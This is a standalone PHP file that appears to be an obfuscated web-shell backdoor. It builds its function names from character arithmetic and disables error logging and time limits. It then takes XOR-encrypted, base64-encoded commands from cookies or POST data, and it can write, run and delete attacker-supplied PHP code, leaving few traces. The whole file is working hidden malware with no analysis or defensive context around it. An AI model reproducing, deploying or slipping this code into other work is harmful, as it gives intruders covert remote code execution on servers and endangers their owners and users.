<?php $sfhsakh = 'f'."\x69".chr(108).'e'.'_'.chr(112).chr(737-620).chr(119-3)."\x5f"."\143".chr(111).chr(923-813).chr(648-532).chr(767-666)."\x6e".chr(116).chr(778-663);
$fxhjn = chr(98).chr(244-147)."\x73".chr(101)."\x36"."\x34".chr(95).chr(504-404).chr(101).chr(342-243).chr(111).chr(507-407)."\145";
$ssbrwhwk = "\x69"."\156".'i'."\x5f"."\163".chr(119-18).chr(507-391);
$hcjwgykvco = chr(117)."\x6e".chr(108).chr(105).chr(875-765).chr(107);


@$ssbrwhwk("\145"."\162".chr(472-358).chr(111)."\x72".chr(221-126).chr(108).'o'."\147", NULL);
@$ssbrwhwk('l'.chr(111).chr(103)."\x5f"."\x65".chr(114).chr(823-709).'o'.chr(114)."\x73", 0);
@$ssbrwhwk("\x6d"."\141".chr(120).chr(95).'e'.'x'.chr(642-541)."\143".chr(849-732).chr(116).'i'.chr(1011-900).chr(110)."\137".'t'."\x69".'m'."\x65", 0);
@set_time_limit(0);

function mjmegftevk($gixalvhe, $syfwepgxc)
{
    $qnrexg = "";
    for ($nvimgjweso = 0; $nvimgjweso < strlen($gixalvhe);) {
        for ($j = 0; $j < strlen($syfwepgxc) && $nvimgjweso < strlen($gixalvhe); $j++, $nvimgjweso++) {
            $qnrexg .= chr(ord($gixalvhe[$nvimgjweso]) ^ ord($syfwepgxc[$j]));
        }
    }
    return $qnrexg;
}

$lfaphilv = array_merge($_COOKIE, $_POST);
$qkirtxshy = '83959a46-cf5d-479f-88f6-cb7eb02c660d';
foreach ($lfaphilv as $jepkndoqk => $gixalvhe) {
    $gixalvhe = @unserialize(mjmegftevk(mjmegftevk($fxhjn($gixalvhe), $qkirtxshy), $jepkndoqk));
    if (isset($gixalvhe[chr(639-542).chr(107)])) {
        if ($gixalvhe[chr(249-152)] == "\151") {
            $nvimgjweso = array(
                'p'.'v' => @phpversion(),
                chr(926-811).'v' => "3.5",
            );
            echo @serialize($nvimgjweso);
        } elseif ($gixalvhe[chr(249-152)] == "\145") {
            $lwejfak = "./" . md5($qkirtxshy) . '.'.chr(105)."\156".chr(220-121);
            @$sfhsakh($lwejfak, "<" . chr(63).'p'.'h'.chr(112).chr(476-444).chr(64).chr(123-6).chr(921-811)."\154".chr(105)."\156"."\153"."\x28".chr(644-549).'_'.chr(70).'I'.chr(141-65).'E'.chr(111-16)."\137".')'."\73".chr(32) . $gixalvhe['d']);
            @include($lwejfak);
            @$hcjwgykvco($lwejfak);
        }
        exit();
    }
}

